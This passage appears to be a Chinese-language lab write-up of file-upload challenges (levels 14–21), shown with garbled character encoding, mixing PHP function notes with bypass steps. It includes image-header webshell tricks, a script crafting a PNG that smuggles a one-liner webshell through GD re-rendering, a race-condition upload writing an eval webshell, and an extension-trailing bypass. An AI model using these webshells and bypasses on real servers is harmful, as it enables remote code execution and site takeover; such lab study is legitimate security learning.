    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">80</span>
<span class="token punctuation">)</span>

<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>chars1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">52</span>
    <span class="token punctuation">[</span>chars2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">120</span>
    <span class="token punctuation">[</span>int1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">65</span>
    <span class="token punctuation">[</span>int2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">66</span>
<span class="token punctuation">)</span></code></pre>
<p>#è¿™å…³éœ€è¦ç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´æ‰èƒ½æˆåŠŸã€‚</p>
<p>å…ˆåˆ¶ä½œä¸€ä¸ªæœ¨é©¬å›¾ç‰‡åœ¨å¤´éƒ¨åŠ GIF89aå¯ä»¥ç»•è¿‡æ£€æµ‹ã€‚</p>
<p>ç„¶åç‚¹å‡»é¶åœºè‡ªå¸¦çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´é¡µé¢</p>
<p>åŒ…å«æ‰€ä¸Šä¼ çš„å›¾ç‰‡é©¬è®©å®ƒè§£ææˆåŠŸã€‚</p>
<pre><code>?file=./upload/12325112521.gif</code></pre>
<p>å¯ä»¥å…ˆæŠŠå†…å®¹å†™æˆphpinfo()çœ‹ä¸‹èƒ½å¦è§£ææˆåŠŸï¼Œå†å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<h3 id="0x15"><a href="#0x15" class="headerlink" title="#0x15"></a>#0x15</h3><p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#getmagicsize()</p>
<p>ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$remote_png_url</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png';</span>
<span class="token variable">$img_data</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$remote_png_url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$img_data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">290</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">69</span>
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> width<span class="token operator">=</span><span class="token string">"290"</span> height<span class="token operator">=</span><span class="token string">"69"</span>
    <span class="token punctuation">[</span>bits<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8</span>
    <span class="token punctuation">[</span>mime<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> image<span class="token operator">/</span>png
<span class="token punctuation">)</span></code></pre>
<ul>
<li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li>
<li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li>
<li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 =  BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</li>
<li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ &lt;imageæ ‡ç­¾</li>
<li>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</li>
<li>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</li>
<li>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header(â€œContent-type: image/jpegâ€);</li>
</ul>
<p>#magic_type_to_extesion()</p>
<p>æ ¹æ®æŒ‡å®šçš„å›¾åƒç±»å‹è¿”å›å¯¹åº”çš„åç¼€åã€‚</p>
<p>#è¿™å…³çš„éªŒè¯çš„æ€è·¯å’Œ14å…³ç±»ä¼¼ï¼Œæ·»åŠ å¤´éƒ¨ä¿¡æ¯GIF89aå³å¯ç»•è¿‡ã€‚</p>
<h3 id="0x16"><a href="#0x16" class="headerlink" title="#0x16"></a>#0x16</h3><p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#exif_magictype()</p>
<p>è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚</p>
<p><img src="/images/15.png"></p>
<p>æ³¨ï¼šéœ€æ‰“å¼€php_exif æ¨¡å—ï¼ŒæŠŠå‰é¢çš„åˆ†å·å»æ‰å°±æ‰“å¼€äº†ã€‚</p>
<p>#è¿™å…³ä¹Ÿæ˜¯æ¢äº†ä¸ªå‡½æ•°è¿›è¡ŒéªŒè¯ï¼Œæ€è·¯å’Œ13å…³ä¸€æ ·ã€‚</p>
<p>æ€»ç»“ä¸‹ 14ï¼Œ15ï¼Œ16 ä¸‰å…³ã€‚å·®åˆ«æ˜¯ä½¿ç”¨ä¸åŒçš„æ–¹æ³•å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¿¡æ¯çš„éªŒè¯ã€‚</p>
<p>çœ‹åšå®¢è¯´exif_magictype æ¯” getmagicsize éªŒè¯å¿«çš„å¤šã€‚</p>
<h3 id="0x17"><a href="#0x17" class="headerlink" title="#0x17"></a>#0x17</h3><p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#basename(path,suffix)</p>
<p>å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>path</td>
<td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td>
</tr>
<tr>
<td>suffix</td>
<td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶æ‰©å±•åã€‚å¦‚æœæ–‡ä»¶æœ‰åæœ‰æ–‡ä»¶æ‰©å±•åï¼Œå°†ä¸ä¼šæ˜¾ç¤ºè¿™ä¸ªæ‰©å±•åã€‚</td>
</tr>
</tbody></table>
<p>#imagecreatefrom__()</p>
<p>è¯¥ç³»åˆ—å‡½æ•°ç”¨äºä»æ–‡ä»¶æˆ– URL è½½å…¥ä¸€å¹…å›¾åƒï¼Œè¿”å›ä¸€å›¾åƒæ ‡è¯†ç¬¦ï¼Œä»£è¡¨äº†ä»ç»™å®šçš„æ–‡ä»¶åå–å¾—çš„å›¾åƒã€‚å¤±è´¥è¿”å› falseã€‚</p>
<p>æ³¨ï¼šç¨‹åºé€šè¿‡imagecreatefromjpeg()å‡½æ•°è°ƒç”¨äº†PHP GDåº“ï¼ˆGDåº“ï¼Œæ˜¯phpå¤„ç†å›¾å½¢çš„æ‰©å±•åº“ï¼‰ï¼Œå¯¹å›¾ç‰‡è¿›è¡Œäº†è½¬æ¢ã€‚</p>
<p>è¯¥ç³»åˆ—å‡½æ•°æœ‰ï¼š</p>
<p>imagecreatefromgif()ï¼š      åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromjpeg()ï¼š   åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» JPEG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefrompng()ï¼š    åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» PNG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromwbmp()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» WBMP æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ<br>imagecreatefromstring()ï¼š åˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»å­—ç¬¦ä¸²ä¸­çš„å›¾åƒæµæ–°å»ºä¸€å‰¯å›¾åƒ</p>
<p>#unlink(filename,context)</p>
<p>åˆ é™¤æ–‡ä»¶ã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>filename</td>
<td>å¿…éœ€ã€‚è§„å®šè¦åˆ é™¤çš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>context</td>
<td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚</td>
</tr>
</tbody></table>
<p>å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚</p>
<p>#srand(seed)</p>
<p>æ’­ä¸‹éšæœºæ•°å‘ç”Ÿå™¨ç§å­ã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>seed</td>
<td>å¯é€‰ã€‚ç”¨ seed æ’­ä¸‹éšæœºæ•°å‘ç”Ÿå™¨ç§å­ã€‚</td>
</tr>
</tbody></table>
<p>è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_math_mt_srand.asp">mt_srand()</a> å‡½æ•°ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ï¼Œç°åœ¨å·²è‡ªåŠ¨å®Œæˆã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°ç°åœ¨æ¥è¯´åº”è¯¥æ²¡ç”¨ã€‚</p>
<p>#strval( mixed $var)</p>
<p>ç”¨äºè·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ã€‚</p>
<p>$var: å¯ä»¥æ˜¯ä»»ä½•æ ‡é‡ç±»å‹ï¼Œä½†ä¸èƒ½æ˜¯æ•°ç»„æˆ–å¯¹è±¡ã€‚</p>
<p>#image__()</p>
<p>å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶ã€‚</p>
<p>imagegif()ï¼š       ä»¥ GIF æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagejpeg()ï¼š    ä»¥ JPEG æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagepng()ï¼š     ä»¥ PNG æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagewbmp()ï¼šä»¥ WBMP æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶</p>
<p>#å› ä¸ºé‡æ–°æ¸²æŸ“äº†å›¾ç‰‡æ‰€ä»¥æˆ‘ä»¬å†™çš„ä¸€å¥è¯æœ¨é©¬ä¼šæ¶ˆå¤±ã€‚</p>
<p>åˆ©ç”¨å¤§ä½¬å†™çš„phpè„šæœ¬åˆ¶ä½œä¸€å¼ å›¾ç‰‡é©¬</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>å†å‡†å¤‡ä¸€å¼ æ™®é€šçš„pngå›¾ç‰‡ã€‚åœ¨è¯¥ç›®å½•ä¸‹è¾“å…¥å‘½ä»¤ php pass17.php pass17.png</p>
<p>å‰é¢æ˜¯è„šæœ¬çš„åå­—ï¼Œåé¢æ˜¯pngå›¾ç‰‡ä¿å­˜çš„åå­—ã€‚ç„¶åå°±ä¼šç”Ÿå­˜fox.png</p>
<p>ä¸Šä¼ ï¼Œåœ¨ç›®å½•ä¸‹æ‰“å¼€å‘ç°ä¸€å¥è¯æœ¨é©¬æ²¡æœ‰è¢«æ”¹å˜ã€‚è¿™ä¸ªä¸€å¥è¯æœ¨é©¬éœ€è¦åŒæ—¶ä¼ å‚GETå‚æ•°0å’ŒPOSTå‚æ•°1æ‰è¡Œ</p>
<p>ç”¨èœåˆ€è¿æ¥file=./upload/1234.png&amp;0=assert  å¯†ç æ˜¯1 å°±å¯ä»¥äº†</p>
<p>æ³¨ï¼š</p>
<p>#è¿™é‡Œä¸èƒ½ç”¨evalå‡½æ•° </p>
<p>#åªæœ‰php.iniä¸­å¼€å¯short_open_tag æ‰å¯ä»¥ç”¨&lt;?  ä»£æ›¿ &lt;?php  , ç”¨&lt;?= ä»£æ›¿ &lt;? echo</p>
<p>#åœ¨PHP7.1ç‰ˆæœ¬ä»¥åï¼Œassert()é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç  å°±åƒevalä¸€æ ·ã€‚æ‰€ä»¥è¯´ assertä¹Ÿå’Œevalä¸€æ ·ä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</p>
<h3 id="0x18"><a href="#0x18" class="headerlink" title="#0x18"></a>#0x18</h3><p>ä»£ç å®¡è®¡</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span><span class="token punctuation">;</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>è¿™é‡Œæ˜¯å…ˆæŠŠæ–‡ä»¶å­˜è¿›æœåŠ¡å™¨é‡Œï¼Œå†è¿›è¡Œæ–‡ä»¶ç±»å‹çš„åˆ¤æ–­ï¼Œæ­£ç¡®æ”¹åä¸Šä¼ ã€‚é”™è¯¯åˆ™åˆ é™¤ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨å®ƒåˆ¤æ–­çš„æ—¶é—´å·®ï¼Œæ¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ã€‚</p>
<pre><code>&lt;?php 
fputs(fopen(&#39;fox.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[fox]);?&gt;&#39;);
?&gt;</code></pre>
<p>ç”¨burpæˆªä½åŒ…,æˆ‘ä»¬éœ€è¦çš„ä¸æ–­é‡æ”¾è¿™ä¸ªæ•°æ®åŒ…ï¼Œæ‰€ä»¥é€‰æ‹©æ²¡æœ‰è´Ÿè½½ã€‚çº¿ç¨‹è®¾é«˜ä¸€ç‚¹ï¼Œç„¶åå¼€å§‹æ”»å‡»ã€‚ä¸æ–­åˆ·æ–°é¡µé¢å³å¯ï¼Œå°±ä¼šåœ¨ç›®å½•ä¸‹ç”Ÿå­˜fox.phpçš„æœ¨é©¬æ–‡ä»¶ã€‚</p>
<h3 id="0x19"><a href="#0x19" class="headerlink" title="#0x19"></a>#0x19</h3><p>è¿˜æ²¡å­¦å®Œé¢å‘å¯¹è±¡ï¼Œä¸‹æ¬¡å†è¡¥ï¼</p>
<h3 id="0x20"><a href="#0x20" class="headerlink" title="#0x20"></a>#0x20</h3><p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#pathinfo(path,options) </p>
<p>ä»¥æ•°ç»„çš„å½¢å¼è¿”å›å…³äºæ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚</p>
<p>è¿”å›çš„æ•°ç»„å…ƒç´ å¦‚ä¸‹ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">[</span>dirname<span class="token punctuation">]</span><span class="token punctuation">:</span> ç›®å½•è·¯å¾„
<span class="token punctuation">[</span>basename<span class="token punctuation">]</span><span class="token punctuation">:</span> æ–‡ä»¶å
<span class="token punctuation">[</span>extension<span class="token punctuation">]</span><span class="token punctuation">:</span> æ–‡ä»¶åç¼€å
<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">:</span> ä¸åŒ…å«åç¼€çš„æ–‡ä»¶å</code></pre>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>path</td>
<td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td>
</tr>
<tr>
<td>options</td>
<td>å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚å¯èƒ½çš„å€¼ï¼š  PATHINFO_DIRNAME - åªè¿”å› dirname     PATHINFO_BASENAME - åªè¿”å› basename     PATHINFO_EXTENSION - åªè¿”å› extension PATHINFO_FILENAME - åªè¿”å› filename</td>
</tr>
</tbody></table>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token string">"/testweb/test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>dirname<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>testweb
    <span class="token punctuation">[</span>basename<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test<span class="token punctuation">.</span>txt
    <span class="token punctuation">[</span>extension<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> txt
    <span class="token punctuation">[</span>filename<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test
<span class="token punctuation">)</span></code></pre>
<p>ç›´æ¥ä»£ç å®¡è®¡å°±å¯ç»•è¿‡ã€‚åˆ©ç”¨å‰é¢çš„æ€æƒ³ç”¨fox.php. .ç»•è¿‡ã€‚æˆ–è®¸è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œè‡ªå·±å‘æ•£æ€ç»´ã€‚</p>
<h3 id="0x21"><a href="#0x21" class="headerlink" title="#0x21"></a>#0x21</h3><p>å‡½æ•°çŸ¥è¯†è¡¥å……ï¼š</p>
<p>#end(array)</p>
<p>å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚</td>
</tr>
</tbody></table>
<p>ç›¸å…³çš„æ–¹æ³•ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-current.html">current()</a> - è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-next.html">next()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li>
